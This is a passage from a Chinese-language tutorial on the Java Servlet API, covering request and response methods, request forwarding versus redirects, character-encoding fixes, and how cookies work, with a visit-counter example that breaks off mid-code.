<li><strong>请求头 (Request Headers):</strong> 包含一系列键值对，提供了关于客户端、请求本身和内容的元数据（如 <code>User-Agent</code>, <code>Accept</code>, <code>Cookie</code>）。</li>
<li><strong>请求体 (Request Body):</strong> 包含了客户端发送给服务器的实际数据，例如 HTML 表单提交的数据、JSON 数据等。（GET 请求通常没有请求体）。</li>
</ol>
<p><strong>关键点：</strong> 我们作为开发者<strong>从不自己创建</strong> <code>HttpServletRequest</code> 对象，而是由 Servlet 容器（如 Tomcat）为我们解析原始的网络数据流并封装好。</p>
<hr>
<h3 id="1-2-获取请求行信息"><a href="#1-2-获取请求行信息" class="headerlink" title="1.2 获取请求行信息"></a>1.2 获取请求行信息</h3><p>这些方法用于获取 HTTP 请求的第一行内容。</p>
<p>假设客户端请求的 URL 是：<code>http://localhost:8080/myapp/user/info?id=123</code></p>
<ul>
<li><code>String getMethod()</code>: 获取请求方式。<ul>
<li><strong>示例:</strong> <code>request.getMethod();</code> &#x2F;&#x2F; 返回 “GET”</li>
</ul>
</li>
<li><code>String getRequestURI()</code>: 获取请求的资源标识符路径（从项目名开始，不包括协议、主机、端口和查询参数）。<ul>
<li><strong>示例:</strong> <code>request.getRequestURI();</code> &#x2F;&#x2F; 返回 “&#x2F;myapp&#x2F;user&#x2F;info”</li>
</ul>
</li>
<li><code>StringBuffer getRequestURL()</code>: 获取客户端请求的完整 URL（不包括查询参数）。<ul>
<li><strong>示例:</strong> <code>request.getRequestURL();</code> &#x2F;&#x2F; 返回 “<a target="_blank" rel="noopener" href="http://localhost:8080/myapp/user/info">http://localhost:8080/myapp/user/info</a>“</li>
</ul>
</li>
<li><code>String getContextPath()</code>: 获取当前 Web 应用的上下文路径（即项目名）。在构建动态链接时非常有用。<ul>
<li><strong>示例:</strong> <code>request.getContextPath();</code> &#x2F;&#x2F; 返回 “&#x2F;myapp”</li>
</ul>
</li>
<li><code>String getQueryString()</code>: 获取 URL 中 <code>?</code> 后面的查询字符串。<ul>
<li><strong>示例:</strong> <code>request.getQueryString();</code> &#x2F;&#x2F; 返回 “id&#x3D;123”</li>
</ul>
</li>
<li><code>String getProtocol()</code>: 获取请求使用的协议和版本。<ul>
<li><strong>示例:</strong> <code>request.getProtocol();</code> &#x2F;&#x2F; 返回 “HTTP&#x2F;1.1”</li>
</ul>
</li>
<li><code>String getRemoteAddr()</code>: 获取客户端的 IP 地址。</li>
</ul>
<hr>
<h3 id="1-3-获取请求头信息"><a href="#1-3-获取请求头信息" class="headerlink" title="1.3 获取请求头信息"></a>1.3 获取请求头信息</h3><p>这些方法用于获取 HTTP 请求头中的键值对。</p>
<ul>
<li><p><code>String getHeader(String name)</code>: 根据头名称获取对应的头信息值。头名称不区分大小写。</p>
<ul>
<li><strong>示例:</strong> <code>String userAgent = request.getHeader(&quot;User-Agent&quot;);</code> &#x2F;&#x2F; 获取浏览器信息</li>
</ul>
</li>
<li><p><code>java.util.Enumeration&lt;String&gt; getHeaderNames()</code>: 获取所有请求头的名称集合。</p>
<ul>
<li><p><strong>示例:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Enumeration&lt;String&gt; headerNames = request.getHeaderNames();</span><br><span class="line"><span class="keyword">while</span>(headerNames.hasMoreElements())&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">headerName</span> <span class="operator">=</span> headerNames.nextElement();</span><br><span class="line">    System.out.println(headerName + <span class="string">&quot;: &quot;</span> + request.getHeader(headerName));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-4-获取请求参数"><a href="#1-4-获取请求参数" class="headerlink" title="1.4 获取请求参数"></a>1.4 获取请求参数</h3><p>这是 <code>HttpServletRequest</code> 最常用的功能之一，用于获取客户端通过表单或 URL 查询字符串提交的数据。</p>
<ul>
<li><code>String getParameter(String name)</code>: 根据参数名获取参数值。这是<strong>最常用</strong>的方法。<ul>
<li>如果参数存在，返回其 <code>String</code> 类型的值。</li>
<li>如果参数不存在，返回 <code>null</code>。</li>
</ul>
</li>
<li><code>String[] getParameterValues(String name)</code>: 根据参数名获取一个参数的所有值。常用于处理复选框（checkboxes）这类可以有多个值的表单元素。<ul>
<li>返回一个 <code>String</code> 数组。</li>
<li>如果参数不存在，返回 <code>null</code>。</li>
</ul>
</li>
<li><code>java.util.Map&lt;String, String[]&gt; getParameterMap()</code>: 获取所有请求参数的 Map。<ul>
<li>Map 的键是参数名 (<code>String</code>)。</li>
<li>Map 的值是该参数对应的所有值的 <code>String</code> 数组 (<code>String[]</code>)。</li>
</ul>
</li>
</ul>
<p><strong>示例:</strong></p>
<p>假设有一个表单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    Hobbies:</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;reading&quot;</span>&gt;</span> Reading</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;coding&quot;</span>&gt;</span> Coding</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在 Servlet 中可以这样获取：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>); <span class="comment">// &quot;admin&quot;</span></span><br><span class="line">String[] hobbies = request.getParameterValues(<span class="string">&quot;hobby&quot;</span>); <span class="comment">// [&quot;reading&quot;, &quot;coding&quot;]</span></span><br></pre></td></tr></table></figure>

<p><strong>请求参数中文乱码问题</strong></p>
<p>这是一个经典且必须掌握的问题。</p>
<ul>
<li><p><strong>GET 请求乱码：</strong></p>
<ul>
<li>GET 请求的参数在 URL 中，其编码由服务器（如 Tomcat）的配置决定。</li>
<li><strong>解决方案：</strong> 修改 Tomcat 的 <code>server.xml</code> 文件，在 <code>&lt;Connector&gt;</code> 标签中添加 <code>URIEncoding=&quot;UTF-8&quot;</code>。这是推荐的做法。</li>
</ul>
</li>
<li><p><strong>POST 请求乱码：</strong></p>
<ul>
<li><p>POST 请求的参数在请求体中，其编码由请求头中的 <code>Content-Type</code> 决定。</p>
</li>
<li><p><strong>解决方案：</strong> 在<strong>第一次调用任何 <code>getParameter</code> 系列方法之前</strong>，设置请求体的解码字符集。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>); <span class="comment">// 必须在获取任何参数之前调用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-5-作为域对象"><a href="#1-5-作为域对象" class="headerlink" title="1.5 作为域对象"></a>1.5 作为域对象</h3><p><code>HttpServletRequest</code> 也是一个“域对象”，它提供了一个内部的存储空间（类似一个 Map），可以在<strong>一次请求的生命周期内</strong>传递数据。</p>
<p>这个功能是实现 MVC 模式中 <strong>Controller (Servlet) 向 View (JSP) 传递数据</strong>的核心机制。</p>
<ul>
<li><code>void setAttribute(String name, Object value)</code>: 将一个对象存入 request 域中。</li>
<li><code>Object getAttribute(String name)</code>: 根据名称从 request 域中取出对象（需要手动类型转换）。</li>
<li><code>void removeAttribute(String name)</code>: 从 request 域中移除一个对象。</li>
</ul>
<p><strong>典型场景：</strong></p>
<ol>
<li>一个 Servlet 接收到请求，从数据库查询到一个 <code>User</code> 对象。</li>
<li>Servlet 调用 <code>request.setAttribute(&quot;userInfo&quot;, userObject);</code> 将用户对象存入 request 域。</li>
<li>Servlet 通过<strong>请求转发</strong>将请求交给一个 JSP 页面。</li>
<li>JSP 页面可以通过 <code>${userInfo}</code> (EL 表达式) 或 <code>request.getAttribute(&quot;userInfo&quot;)</code> (Java 脚本) 来获取并展示这个 <code>User</code> 对象的信息。</li>
</ol>
<hr>
<h3 id="1-6-请求转发-RequestDispatcher"><a href="#1-6-请求转发-RequestDispatcher" class="headerlink" title="1.6 请求转发 (RequestDispatcher)"></a>1.6 请求转发 (<code>RequestDispatcher</code>)</h3><p>请求转发是一种<strong>服务器内部</strong>的资源跳转方式。</p>
<ul>
<li><strong>工作原理：</strong> Servlet 处理完部分逻辑后，将请求和响应对象“转发”给服务器上的另一个资源（如另一个 Servlet 或 JSP），由目标资源继续处理并最终生成响应。</li>
<li><strong>获取方式：</strong> <code>RequestDispatcher dispatcher = request.getRequestDispatcher(&quot;/path/to/resource&quot;);</code></li>
<li><strong>执行转发：</strong> <code>dispatcher.forward(request, response);</code></li>
</ul>
<p><strong>核心特点：</strong></p>
<ol>
<li><strong>一次请求：</strong> 整个过程对于客户端来说是一次请求和一次响应。</li>
<li><strong>地址栏不变：</strong> 客户端浏览器的地址栏不会发生变化。</li>
<li><strong>数据共享：</strong> 因为使用的是同一个 request 对象，所以可以通过 <code>request.setAttribute()</code> 在转发的 Servlet 和 JSP 之间共享数据。</li>
<li><strong>服务器内部行为：</strong> 只能转发到当前 Web 应用内部的资源。</li>
</ol>
<hr>
<h2 id="2-HttpServletResponse-响应对象"><a href="#2-HttpServletResponse-响应对象" class="headerlink" title="2. HttpServletResponse (响应对象)"></a>2. HttpServletResponse (响应对象)</h2><h3 id="2-1-作用"><a href="#2-1-作用" class="headerlink" title="2.1 作用"></a>2.1 作用</h3><p><code>HttpServletResponse</code> 对象由 Servlet 容器创建，并作为参数传递给 Servlet 的服务方法。它的核心作用是<strong>封装服务器对客户端请求的响应</strong>，让开发者能够方便地将处理结果发送回客户端（通常是浏览器）。</p>
<p>它主要用于设置 HTTP 响应的三个部分：</p>
<ol>
<li><strong>响应行 (Status Line):</strong> 包括 HTTP 协议版本、一个状态码（如 200 OK, 404 Not Found）和状态描述。</li>
<li><strong>响应头 (Response Headers):</strong> 包含一系列键值对，告诉浏览器如何处理响应内容（如 <code>Content-Type</code>, <code>Content-Length</code>, <code>Set-Cookie</code>）。</li>
<li><strong>响应体 (Response Body):</strong> 包含了要发送给客户端的实际数据，如 HTML 页面、JSON 字符串、图片数据等。</li>
</ol>
<p><strong>关键点：</strong> 与 <code>HttpServletRequest</code> 一样，我们<strong>从不自己创建</strong> <code>HttpServletResponse</code> 对象，而是由容器提供，我们负责填充它。</p>
<hr>
<h3 id="2-2-设置响应行"><a href="#2-2-设置响应行" class="headerlink" title="2.2 设置响应行"></a>2.2 设置响应行</h3><p>我们通常只关心响应行中的<strong>状态码 (Status Code)</strong>，它告诉客户端请求处理的结果。</p>
<ul>
<li><code>void setStatus(int sc)</code>: 设置响应的状态码。<ul>
<li><strong>示例:</strong> <code>response.setStatus(HttpServletResponse.SC_OK);</code> &#x2F;&#x2F; 设置状态码为 200</li>
<li><strong>示例:</strong> <code>response.setStatus(404);</code> &#x2F;&#x2F; 设置状态码为 404</li>
</ul>
</li>
</ul>
<p><strong>常用状态码：</strong></p>
<ul>
<li><code>200 OK</code>: 请求成功。</li>
<li><code>302 Found</code>: 临时重定向（<code>sendRedirect</code> 方法会自动设置这个状态码）。</li>
<li><code>304 Not Modified</code>: 客户端缓存的资源未过期。</li>
<li><code>400 Bad Request</code>: 请求语法错误。</li>
<li><code>403 Forbidden</code>: 服务器拒绝执行该请求。</li>
<li><code>404 Not Found</code>: 请求的资源不存在。</li>
<li><code>500 Internal Server Error</code>: 服务器内部发生错误。</li>
</ul>
<hr>
<h3 id="2-3-设置响应头"><a href="#2-3-设置响应头" class="headerlink" title="2.3 设置响应头"></a>2.3 设置响应头</h3><p>响应头用于向浏览器提供指令性信息。</p>
<ul>
<li><code>void setHeader(String name, String value)</code>: 设置一个指定名称的响应头。如果该头已存在，新值会覆盖旧值。</li>
<li><code>void addHeader(String name, String value)</code>: 添加一个指定名称的响应头。如果该头已存在，不会覆盖，而是添加一个新的同名头。</li>
</ul>
<p><strong>最常用的响应头设置：</strong></p>
<ol>
<li><strong><code>Content-Type</code> (内容类型):</strong><ul>
<li>这是最重要的响应头，它告诉浏览器响应体是什么类型的数据以及使用什么字符集来解码。</li>
<li>格式: <code>MIME类型;charset=编码</code></li>
<li><strong>便捷方法:</strong> <code>response.setContentType(&quot;text/html;charset=UTF-8&quot;);</code></li>
<li>如果不设置字符集，浏览器可能因解码错误而显示乱码。</li>
</ul>
</li>
<li><strong><code>Location</code> (位置):</strong><ul>
<li>与 <code>302</code> 状态码配合使用，告诉浏览器要重定向到的新地址。<code>sendRedirect</code> 方法会自动设置它。</li>
</ul>
</li>
<li><strong><code>Content-Disposition</code> (内容处置):</strong><ul>
<li>用于指示浏览器如何处理响应体，通常用于<strong>文件下载</strong>。</li>
<li><code>response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=report.xls&quot;);</code></li>
<li><code>attachment</code> 表示作为附件下载，<code>filename</code> 指定了默认的文件名。</li>
</ul>
</li>
<li><strong><code>Refresh</code> (刷新):</strong><ul>
<li>告诉浏览器在指定秒数后刷新页面，或跳转到另一个页面。</li>
<li><code>response.setHeader(&quot;Refresh&quot;, &quot;5;url=http://www.google.com&quot;);</code> &#x2F;&#x2F; 5秒后跳转到谷歌</li>
</ul>
</li>
</ol>
<hr>
<h3 id="2-4-设置响应体"><a href="#2-4-设置响应体" class="headerlink" title="2.4 设置响应体"></a>2.4 设置响应体</h3><p>响应体是发送给客户端的实际数据。Servlet 提供了两种输出流来写入响应体，<strong>但两者是互斥的，一次响应中只能使用其中一个</strong>。</p>
<ol>
<li><p><strong>字符输出流 <code>PrintWriter getWriter()</code></strong></p>
<ul>
<li>用于输出<strong>文本数据</strong>，如 HTML, XML, JSON, Plain Text。</li>
<li>它具有平台无关的 <code>print()</code> 和 <code>println()</code> 方法，非常方便。</li>
<li><strong>注意：</strong> 在调用 <code>getWriter()</code> 之前，最好先通过 <code>response.setContentType(...)</code> 或 <code>response.setCharacterEncoding(...)</code> 设置好字符编码，否则可能产生乱码。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">out.println(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;body&gt;&lt;h1&gt;你好，世界！&lt;/h1&gt;&lt;/body&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>字节输出流 <code>ServletOutputStream getOutputStream()</code></strong></p>
<ul>
<li>用于输出<strong>非文本的二进制数据</strong>，如图片、视频、PDF 文件、ZIP 压缩包等。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">response.setContentType(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line"><span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line"><span class="comment">// 从文件或其他来源读取图片字节数据，并写入到 out 流中...</span></span><br><span class="line"><span class="comment">// out.write(imageDataBytes);</span></span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p><strong>严重警告：</strong> 如果同时尝试调用 <code>getWriter()</code> 和 <code>getOutputStream()</code>，容器会抛出 <code>IllegalStateException</code>。</p>
</blockquote>
<hr>
<h3 id="2-5-页面跳转：重定向"><a href="#2-5-页面跳转：重定向" class="headerlink" title="2.5 页面跳转：重定向"></a>2.5 页面跳转：重定向</h3><p>重定向 (Redirect) 是一种<strong>客户端</strong>行为的跳转方式。</p>
<ul>
<li><p><strong>工作原理：</strong> 服务器向客户端发送一个特殊的响应（状态码 302 和一个 <code>Location</code> 响应头），客户端浏览器接收到这个响应后，会<strong>自动发起一个新的请求</strong>到 <code>Location</code> 头指定的 URL。</p>
</li>
<li><p><strong>实现方法:</strong> <code>void sendRedirect(String location)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理完用户注册逻辑后，重定向到登录页面</span></span><br><span class="line">response.sendRedirect(request.getContextPath() + <span class="string">&quot;/login.jsp&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="2-6-请求转发-forward-与重定向-redirect-的区别"><a href="#2-6-请求转发-forward-与重定向-redirect-的区别" class="headerlink" title="2.6 请求转发 (forward) 与重定向 (redirect) 的区别"></a>2.6 请求转发 (forward) 与重定向 (redirect) 的区别</h3><table>
<thead>
<tr>
<th>特性</th>
<th><strong>请求转发 (Forward)</strong></th>
<th><strong>重定向 (Redirect)</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>行为主体</strong></td>
<td><strong>服务器行为</strong>。服务器内部将请求转交给另一个资源处理。</td>
<td><strong>客户端行为</strong>。服务器建议客户端去请求另一个地址。</td>
</tr>
<tr>
<td><strong>请求次数</strong></td>
<td><strong>1 次</strong>。客户端只发起了一次请求。</td>
<td><strong>2 次</strong>。客户端先请求 Servlet，然后被告知再去请求另一个地址。</td>
</tr>
<tr>
<td><strong>地址栏变化</strong></td>
<td><strong>不变</strong>。地址栏仍然是最初请求的地址。</td>
<td><strong>改变</strong>。地址栏会更新为重定向后的新地址。</td>
</tr>
<tr>
<td><strong>数据共享</strong></td>
<td><strong>可以共享</strong>。转发过程共享同一个 <code>request</code> 对象，可以通过 <code>request.setAttribute()</code> 传递数据。</td>
<td><strong>不能共享</strong>。两次请求是完全独立的，<code>request</code> 对象不同。</td>
</tr>
<tr>
<td><strong>可以跳转的资源</strong></td>
<td>只能跳转到<strong>当前 Web 应用内部</strong>的资源。</td>
<td>可以跳转到<strong>任何有效的 URL</strong>，包括外部网站。</td>
</tr>
<tr>
<td><strong>效率</strong></td>
<td><strong>高</strong>。因为只是服务器内部的调用。</td>
<td><strong>低</strong>。因为需要经过一次客户端与服务器的网络往返。</td>
</tr>
<tr>
<td><strong>核心方法</strong></td>
<td><code>request.getRequestDispatcher(...).forward(req, res)</code></td>
<td><code>response.sendRedirect(...)</code></td>
</tr>
</tbody></table>
<h4 id="使用场景总结："><a href="#使用场景总结：" class="headerlink" title="使用场景总结："></a><strong>使用场景总结：</strong></h4><ul>
<li><strong>使用转发 (Forward):</strong><ul>
<li><strong>MVC 模式</strong>：Servlet (Controller) 处理完业务逻辑后，将数据存入 <code>request</code> 域，然后<strong>转发</strong>到 JSP (View) 进行展示。这是最典型的应用。</li>
</ul>
</li>
<li><strong>使用重定向 (Redirect):</strong><ul>
<li><strong>避免表单重复提交</strong>：当用户提交一个 POST 请求（如注册、下单）处理成功后，<strong>重定向</strong>到一个成功页面。这样即使用户刷新页面，也只是刷新成功页面（GET 请求），不会重复提交表单数据。这被称为 <strong>Post-Redirect-Get (PRG)</strong> 模式。</li>
<li><strong>跳转到外部网站</strong>。</li>
<li><strong>实现登录功能</strong>：用户访问需要登录的页面时，如果未登录，则重定向到登录页面。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="三、会话管理-State-Management"><a href="#三、会话管理-State-Management" class="headerlink" title="三、会话管理 (State Management)"></a>三、会话管理 (State Management)</h1><h2 id="1-Cookie"><a href="#1-Cookie" class="headerlink" title="1. Cookie"></a>1. Cookie</h2><h3 id="1-1-定义-1"><a href="#1-1-定义-1" class="headerlink" title="1.1 定义"></a>1.1 定义</h3><p><strong>Cookie</strong> 是服务器发送到客户端（浏览器）并由客户端保存在本地的一小块<strong>键值对 (key-value) 形式的文本数据</strong>。</p>
<p>当浏览器下次向同一个服务器发送请求时，它会自动将之前保存的 Cookie 数据附加在 HTTP 请求头中一并发送回去。通过这种机制，服务器就能够识别出是哪个用户，从而实现对用户状态的跟踪。</p>
<h3 id="1-2-工作原理"><a href="#1-2-工作原理" class="headerlink" title="1.2 工作原理"></a>1.2 工作原理</h3><p>Cookie 的工作原理完全基于 HTTP 协议的 <strong>请求头 (Request Headers)</strong> 和 <strong>响应头 (Response Headers)</strong>。</p>
<pre><code class="highlight mermaid">sequenceDiagram
    title Cookie 工作原理
    autonumber

    %% 1. 第一次请求 (无 Cookie) %%
    Client-&gt;&gt;Server: 发起请求 (GET /index.html)
    note right of Client: 请求头中没有 Cookie

    %% 2. 第一次响应 (设置 Cookie) %%
    activate Server
    Server--&gt;&gt;Client: 返回响应 (200 OK)
    note left of Server: 响应头包含 Set-Cookie: userID=12345
    deactivate Server
    note right of Client: 浏览器解析并保存 Cookie

    %% 增加分隔，表示后续操作 %%
    rect rgb(240, 240, 240)
        note over Client, Server: 一段时间后，用户再次访问...
    end

    %% 3. 后续请求 (携带 Cookie) %%
    Client-&gt;&gt;Server: 发起后续请求 (GET /profile.html)
    note right of Client: 请求头自动添加 Cookie: userID=12345

    %% 4. 后续响应 (服务器识别用户) %%
    activate Server
    note over Server: 读取 Cookie, 识别用户身份(ID:12345)
    Server--&gt;&gt;Client: 返回个性化响应 (例如：欢迎回来！)
    deactivate Server</code></pre>

<p><strong>流程图解:</strong></p>
<ol>
<li><strong>第一次请求 (客户端 -&gt; 服务器):</strong><ul>
<li>客户端浏览器向服务器发起一个请求。此时，请求头中<strong>没有</strong> <code>Cookie</code> 信息。</li>
</ul>
</li>
<li><strong>第一次响应 (服务器 -&gt; 客户端):</strong><ul>
<li>服务器处理完请求后，决定要为这个客户端设置一个 Cookie。</li>
<li>服务器在 HTTP <strong>响应头</strong>中添加一个 <code>Set-Cookie</code> 字段，内容是 <code>key=value</code> 以及一些可选的属性。</li>
<li>例如：<code>Set-Cookie: userID=12345</code></li>
<li>浏览器接收到这个响应后，会解析 <code>Set-Cookie</code> 头，并将这个 Cookie 保存在本地。</li>
</ul>
</li>
<li><strong>后续请求 (客户端 -&gt; 服务器):</strong><ul>
<li>当浏览器<strong>再次</strong>向同一个服务器（域名和路径匹配）发起请求时，它会自动在 HTTP <strong>请求头</strong>中添加一个 <code>Cookie</code> 字段。</li>
<li><code>Cookie</code> 字段的值就是之前服务器设置的所有相关 Cookie。</li>
<li>例如：<code>Cookie: userID=12345</code></li>
</ul>
</li>
<li><strong>后续响应 (服务器 -&gt; 客户端):</strong><ul>
<li>服务器接收到请求，读取请求头中的 <code>Cookie</code> 信息，就知道“哦，是 ID 为 12345 的用户回来了”，然后就可以根据这个 ID 执行相应的逻辑（如显示个性化内容、保持登录状态等）。</li>
</ul>
</li>
</ol>
<p>这个过程对用户是透明的，完全由浏览器和服务器自动完成。</p>
<hr>
<h3 id="1-3-Cookie-API"><a href="#1-3-Cookie-API" class="headerlink" title="1.3 Cookie API"></a>1.3 Cookie API</h3><p>在 Java Servlet 中，操作 Cookie 主要通过 <code>javax.servlet.http.Cookie</code> 类以及 <code>request</code> 和 <code>response</code> 对象上的方法。</p>
<ol>
<li><strong>创建 Cookie:</strong><ul>
<li><code>Cookie cookie = new Cookie(String name, String value);</code></li>
<li><strong>注意:</strong> Cookie 的 name 和 value <strong>不能包含</strong>中文字符、空格或特殊字符（如 <code>;</code>, <code>,</code>）。如果需要存储，必须先进行 <strong>URL 编码</strong> (<code>URLEncoder.encode()</code>)，读取时再进行解码 (<code>URLDecoder.decode()</code>)。</li>
</ul>
</li>
<li><strong>发送 Cookie 到客户端:</strong><ul>
<li><code>response.addCookie(Cookie cookie);</code></li>
<li>通过 <code>response</code> 对象将创建好的 Cookie 添加到 HTTP 响应头中。</li>
</ul>
</li>
<li><strong>从客户端请求中获取 Cookie:</strong><ul>
<li><code>Cookie[] cookies = request.getCookies();</code></li>
<li>通过 <code>request</code> 对象获取一个 <code>Cookie</code> 数组，包含了客户端本次请求发送过来的所有 Cookie。</li>
<li><strong>注意:</strong> 如果客户端没有发送任何 Cookie，此方法将返回 <code>null</code>，所以在使用前必须进行<strong>空指针判断</strong>。</li>
</ul>
</li>
<li><strong>读取 Cookie 的信息:</strong><ul>
<li><code>String name = cookie.getName();</code></li>
<li><code>String value = cookie.getValue();</code></li>
</ul>
</li>
</ol>
<p><strong>代码示例：记录用户访问次数</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/visitCount&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VisitCountServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1. 尝试从请求中获/取名为 &quot;visitCount&quot; 的 Cookie</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">targetCookie</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Cookie[] cookies = request.getCookies();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Cookie cookie : cookies) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;visitCount&quot;</span>.equals(cookie.getName())) &#123;</span><br><span class="line">                    targetCookie = cookie;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetCookie != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 2. 如果 Cookie 存在，获取其值并加 1</span></span><br><span class="line">            count = Integer.parseInt(targetCookie.getValue()) + <span class="number">1</span>;</span><br><span class="line">            out.write(<span class="string">&quot;&lt;h1&gt;您好，这是您的第 &quot;</span> + count + <span class="string">&quot; 次访问！&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            targetCookie.setValue(String.valueOf(count)); <span class="comment">// 更新 Cookie 的值</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 如果 Cookie 不存在，说明是第一次访问</span></span><br><span class="line">            out.write(<span class="string">&quot;&lt;h1&gt;欢迎您，这是您的第一次访问！&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            targetCookie = <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;visitCount&quot;</span>, String.valueOf(count));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 设置 Cookie 的有效期（例如 1 天）</span></span><br><span class="line">        targetCookie.setMaxAge(<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. 将更新后的 Cookie 发送回客户端</span></span><br><span class="line">        response.addCookie(targetCookie);</span><br><span 